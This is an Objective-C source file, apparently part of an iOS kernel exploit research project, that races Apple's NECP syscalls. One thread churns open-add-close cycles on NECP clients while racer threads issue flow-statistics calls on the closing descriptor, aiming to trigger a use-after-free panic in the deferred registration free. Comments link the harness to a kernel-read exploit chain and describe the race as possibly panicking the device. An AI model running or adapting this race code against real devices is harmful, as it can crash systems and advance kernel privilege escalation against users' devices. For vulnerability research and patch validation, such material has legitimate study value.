//
//  P184T8Falsify.m — the 224-class deferred-free FALSIFICATION harness.
//
//  THE DESIGN TARGET (findings/2026-11-28_t8v2_224class_rearm.md):
//    the T8 v2 lane's free-window matrix says CLOSED: the +0x58 registration
//    refcount has exactly three external retainers, each retaining under a
//    lock the remover also holds; the kernel callouts take no reg ref and
//    are excluded by destroy ordering; the deferred put lands on a racing
//    GET_FLOW_STATISTICS app thread. Matrix prediction: ZERO panics.
//    FALSIFICATION ORACLE: any os_ref overflow/underflow (the +0x58
//    counters), any necp_flow_registration_count invariant panic, or any
//    crash in the closer/stats pair re-scores the lane >= 12 immediately --
//    that pair is the free-race the lane needs.
//
//  THE HARNESS:
//    P1 control (PANIC-FREE): single-threaded open -> ADD -> ADD_FLOW x64
//      -> the stats-action sweep (27 = GET_FLOW_STATISTICS, 11 = COPY_ROUTE_
//      STATISTICS, 6 = the 13432-dispatch candidate) -> close. Which action
//      answers on THIS train decides the racer's ammo.
//    P2 the falsification (armed by Documents/p184_arm.txt, CONSUMED -- one
//      armed tap per fresh boot; PANIC-POSSIBLE by intent):
//      T1 churn: necp_open -> ADD -> ADD_FLOW x64 -> publish (fd,cid) ->
//                close(fd) -> loop. Every close fires the refcount-deferred
//                registration free.
//      T2 racer: snapshot (fd,cid) -> GET_FLOW_STATISTICS(+variants) on the
//                fd T1 may be mid-closing -> loop. The racer uses whatever
//                fd it snapshotted; a close under the stats walk is exactly
//                the matrix's raced pair.
//    P3 verdict: zero panics + clean counters = the closure receipt (the
//      matrix holds -- the lane's honest negative); ANY panic = the matrix
//      falsified at exactly that pair -> the lane re-arms.
//
//  Log p184_t8_falsify_log.txt. NEVER sets hasKread. One armed tap per
//  fresh boot.
//

#import "P184T8Falsify.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <Foundation/Foundation.h>
#import <arpa/inet.h>
#import <errno.h>
#import <fcntl.h>
#import <pthread.h>
#import <string.h>
#import <sys/syscall.h>
#import <unistd.h>

#define P184_BUILD @"p184-t8-falsify-v1"

#ifndef SYS_necp_open
#define SYS_necp_open 463
#endif
#ifndef SYS_necp_client_action
#define SYS_necp_client_action 464
#endif
#define P184_ACTION_ADD               1u
#define P184_ACTION_ADD_FLOW          0x11u
#define P184_ACTION_REMOVE_FLOW       0x12u
#define P184_ACTION_GET_FLOW_STATS    0x1bu    /* 12377 NECP_CLIENT_ACTION_GET_FLOW_STATISTICS */
#define P184_ACTION_COPY_ROUTE_STATS  0x0bu    /* 12377 #11 */
#define P184_ACTION_13432_CANDIDATE   6u       /* Agent D's 13432-dispatch candidate */

static int p184_necp_open_fd(void) {
    int fd = (int)syscall(SYS_necp_open, 0);
    if (fd < 0) fd = (int)syscall(SYS_necp_open, (int)getpid());
    return fd;
}

static int p184_add_client(int fd, uint8_t cid_out[16]) {
    uint8_t params[0x80];
    memset(params, 0, sizeof params);
    if (cid_out) memset(cid_out, 0, 16);
    long rc = syscall(SYS_necp_client_action, fd,
                      (uint64_t)P184_ACTION_ADD,
                      cid_out ? cid_out : (uint8_t *)"",
                      (size_t)0x10, params, (size_t)sizeof params);
    return (int)rc;
}

/* the p179/p053v3-proven ADD_FLOW shape */
static int p184_add_flow(int fd, const uint8_t cid[16], uint16_t port) {
    uint8_t req[0x30];
    memset(req, 0, sizeof req);
    uint8_t sa[16];
    memset(sa, 0, sizeof sa);
    sa[0] = 16;
    sa[1] = AF_INET;
    sa[2] = (uint8_t)(port >> 8);
    sa[3] = (uint8_t)(port & 0xff);
    sa[4] = 127; sa[5] = 0; sa[6] = 0; sa[7] = 1;
    memcpy(req + 0x10, sa, 16);
    *(uint16_t *)(req + 0x20) = 0;
    long rc = syscall(SYS_necp_client_action, fd,
                      (uint64_t)P184_ACTION_ADD_FLOW,
                      (const void *)cid, (size_t)0x10,
                      (const void *)req, sizeof req);
    return (int)rc;
}

static int p184_stats_call(int fd, const uint8_t cid[16], uint64_t action,
                           uint8_t *buf, size_t len) {
    long rc = syscall(SYS_necp_client_action, fd, action,
                      (const void *)cid, (size_t)0x10,
                      (void *)buf, len);
    return (int)rc;
}

/* the shared churn state (the raced pair) */
static volatile int g_p184_fd = -1;
static uint8_t g_p184_cid[16];
static volatile int g_p184_run = 0;
static volatile long g_p184_t1_iters = 0, g_p184_t1_flows = 0, g_p184_t1_errs = 0;
static volatile long g_p184_t2_iters = 0, g_p184_t2_ok = 0, g_p184_t2_errs = 0;
static uint64_t g_p184_action = P184_ACTION_GET_FLOW_STATS;

static void *p184_t1_churn(void *arg) {
    (void)arg;
    uint16_t port = 40000;
    while (g_p184_run) {
        int fd = p184_necp_open_fd();
        if (fd < 0) { g_p184_t1_errs++; continue; }
        uint8_t cid[16];
        if (p184_add_client(fd, cid) != 0) { close(fd); g_p184_t1_errs++; continue; }
        int ok = 0;
        for (int i = 0; i < 64; i++) {
            if (p184_add_flow(fd, cid, (uint16_t)(port++ & 0xFFFF)) == 0) ok++;
        }
        g_p184_t1_flows += ok;
        /* publish, then close -- the deferred registration free races T2 */
        memcpy(g_p184_cid, cid, 16);
        g_p184_fd = fd;
        usleep(200);                       /* the racer's engagement window */
        close(fd);                         /* the refcount-deferred put */
        g_p184_fd = -1;
        g_p184_t1_iters++;
    }
    return NULL;
}

static void *p184_t2_racer(void *arg) {
    (void)arg;
    uint8_t buf[0x400];
    while (g_p184_run) {
        int fd = g_p184_fd;
        if (fd < 0) { usleep(5); continue; }
        uint8_t cid[16];
        memcpy(cid, g_p184_cid, 16);
        int rc = p184_stats_call(fd, cid, g_p184_action, buf, sizeof buf);
        g_p184_t2_iters++;
        if (rc == 0) g_p184_t2_ok++; else g_p184_t2_errs++;
    }
    return NULL;
}

@implementation P184T8Falsify

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:
                    @"p184_t8_falsify_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };

    L([NSString stringWithFormat:@"=== p184 session %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", P184_BUILD]);
    L(@"THE 224-class deferred-free FALSIFICATION harness. The free-window");
    L(@"matrix says CLOSED (zero panics); ANY panic falsifies it and the");
    L(@"lane re-arms at >=12. PANIC-POSSIBLE by intent -- armed by");
    L(@"p184_arm.txt, CONSUMED, ONE TAP PER FRESH BOOT. NEVER hasKread.");
    L([LabDeviceProfile identBlock] ?: @"ident=?");

    /* ── P1: the single-threaded control + the stats-action sweep ── */
    L(@"");
    L(@"=== P1: the control + the action sweep (PANIC-FREE) ===");
    int sfd = p184_necp_open_fd();
    if (sfd < 0) {
        L([NSString stringWithFormat:@"[-] necp_open failed errno=%d", errno]);
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }
    uint8_t scid[16];
    int arc = p184_add_client(sfd, scid);
    L([NSString stringWithFormat:@"[P1] open fd=%d ADD rc=%d cid=%02x%02x...",
       sfd, arc, scid[0], scid[1]]);
    int flows = 0;
    for (int i = 0; i < 64; i++)
        if (p184_add_flow(sfd, scid, (uint16_t)(50000 + i)) == 0) flows++;
    L([NSString stringWithFormat:@"[P1] ADD_FLOW x64 ok=%d", flows]);

    const struct { uint64_t act; const char *nm; } sweep[] = {
        { P184_ACTION_GET_FLOW_STATS,   "27 GET_FLOW_STATISTICS" },
        { P184_ACTION_COPY_ROUTE_STATS, "11 COPY_ROUTE_STATISTICS" },
        { P184_ACTION_13432_CANDIDATE,  "6  (13432-dispatch candidate)" },
    };
    uint64_t chosen = 0;
    uint8_t sbuf[0x400];
    for (size_t i = 0; i < sizeof(sweep)/sizeof(sweep[0]); i++) {
        memset(sbuf, 0, sizeof sbuf);
        int rc = p184_stats_call(sfd, scid, sweep[i].act, sbuf, sizeof sbuf);
        L([NSString stringWithFormat:@"[P1] action %s rc=%d errno=%d",
           sweep[i].nm, rc, rc ? errno : 0]);
        if (rc == 0 && !chosen) chosen = sweep[i].act;
    }
    if (!chosen) chosen = P184_ACTION_GET_FLOW_STATS;
    L([NSString stringWithFormat:
       @"[P1] chosen racer ammo: action %llu%@",
       (unsigned long long)chosen,
       chosen == P184_ACTION_GET_FLOW_STATS ? @" (27 default)" : @""]);
    close(sfd);
    L(@"[P1] control closed clean (the deferred free ran on this thread)");

    /* ── P2: the ARMORY gate ── */
    L(@"");
    L(@"=== P2: the falsification race (Documents/p184_arm.txt -- CONSUMED) ===");
    NSString *armPath = [docs stringByAppendingPathComponent:@"p184_arm.txt"];
    int armed = 0;
    {
        int afd = open([armPath UTF8String], O_RDONLY);
        if (afd >= 0) {
            char b[64];
            ssize_t n = read(afd, b, sizeof b - 1);
            close(afd);
            if (n > 0) armed = 1;
            unlink([armPath UTF8String]);
            L(@"[P2] ARM FILE PRESENT -- the falsification race runs");
            L(@"    (PANIC-POSSIBLE: a panic IS the falsification receipt).");
        } else {
            L(@"[P2] no arm file -- the race HOLDS. Write ANY content to:");
            L([NSString stringWithFormat:@"    %@", armPath]);
        }
    }

    if (armed) {
        g_p184_fd = -1;
        g_p184_run = 1;
        g_p184_t1_iters = g_p184_t1_flows = g_p184_t1_errs = 0;
        g_p184_t2_iters = g_p184_t2_ok = g_p184_t2_errs = 0;
        g_p184_action = chosen;

        pthread_t t1, t2a, t2b;
        pthread_create(&t1, NULL, p184_t1_churn, NULL);
        pthread_create(&t2a, NULL, p184_t2_racer, NULL);
        pthread_create(&t2b, NULL, p184_t2_racer, NULL);
        usleep(15000000);                   /* the 15s armed window */
        g_p184_run = 0;
        pthread_join(t1, NULL);
        pthread_join(t2a, NULL);
        pthread_join(t2b, NULL);

        L([NSString stringWithFormat:
           @"[P2] T1 churn: iters=%ld flows=%ld errs=%ld",
           g_p184_t1_iters, g_p184_t1_flows, g_p184_t1_errs]);
        L([NSString stringWithFormat:
           @"[P2] T2 racer: iters=%ld ok=%ld errs=%ld",
           g_p184_t2_iters, g_p184_t2_ok, g_p184_t2_errs]);
    }

    /* ── P3: verdict ── */
    L(@"");
    L(@"=== P3: VERDICT ===");
    L([NSString stringWithFormat:
       @"[p184] armed=%d ammo=%llu t1=%ld t2=%ld",
       armed, (unsigned long long)chosen,
       g_p184_t1_iters, g_p184_t2_iters]);
    L(@"[=] ZERO PANICS + clean counters = the closure receipt (the 11-28");
    L(@"    free-window matrix HOLDS -- the T8 lane's honest negative).");
    L(@"[=] ANY os_ref / registration-count panic = the matrix FALSIFIED");
    L(@"    at exactly the raced pair -> the lane re-arms at >= 12.");
    L(@"[=] NOT hasKread. The gate stays kread32(kbase) via commitSlide.");

    [[P007Board shared] recordEvent:@"p184_t8_falsify"
                                 kind:@"race"
                               detail:[NSString stringWithFormat:
                                       @"armed=%d t1=%ld t2=%ld",
                                       armed, g_p184_t1_iters, g_p184_t2_iters]
                               source:@"p184"];
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end
